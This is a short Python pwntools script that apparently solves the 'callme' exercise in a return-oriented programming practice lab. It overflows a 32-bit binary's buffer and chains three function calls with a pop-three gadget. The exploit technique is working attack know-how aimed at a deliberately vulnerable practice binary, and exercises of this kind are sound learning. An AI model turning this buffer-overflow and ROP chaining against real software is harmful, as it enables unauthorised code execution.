from pwn import *

"""
Task:
    Call following function:
    callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d):
    callme_two(0xdeadbeef, 0xcafebabe, 0xd00df00d):
    callme_three(0xdeadbeef, 0xcafebabe, 0xd00df00d):

Gadget:
    > ROPgadget --binary callme32
    0x080487f9 : pop esi ; pop edi ; pop ebp ; ret
    0x080484f0: callme_one
    0x08048550: callme_two
    0x080484e0: callme_three
Stack: 
[callme_one]
[pop3_ret]      -> will clear all callme_one arg
[0xdeadbeef]
[0xcafebabe]
[0xd00df00d]
[callme_two]
[pop3_ret]
[0xdeadbeef]
[0xcafebabe]
[0xd00df00d]
[callme_three]
[pop3_ret]
[0xdeadbeef]
[0xcafebabe]
[0xd00df00d]
"""

def exploit():
    p = process("callme32")
    proc.wait_for_debugger(p.pid)

    pop3_ret = 0x080487f9
    callme_one = 0x080484f0
    callme_two = 0x08048550
    callme_three = 0x080484e0

    buf = b""
    buf += b"A"*0x2c
    # buf += b"BBBB"
    # buf += b"CCCCCCCCCC"
    # callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d):
    buf += p32(callme_one)
    buf += p32(pop3_ret)
    buf += p32(0xdeadbeef)
    buf += p32(0xcafebabe)
    buf += p32(0xd00df00d)

    # # callme_two(0xdeadbeef, 0xcafebabe, 0xd00df00d):
    buf += p32(callme_two)
    buf += p32(pop3_ret)
    buf += p32(0xdeadbeef)
    buf += p32(0xcafebabe)
    buf += p32(0xd00df00d)

    # # callme_two(0xdeadbeef, 0xcafebabe, 0xd00df00d):
    buf += p32(callme_three)
    buf += p32(pop3_ret)
    buf += p32(0xdeadbeef)
    buf += p32(0xcafebabe)
    buf += p32(0xd00df00d)

    print("[!] Send payload...")
    p.send(buf)
    p.interactive()
exploit()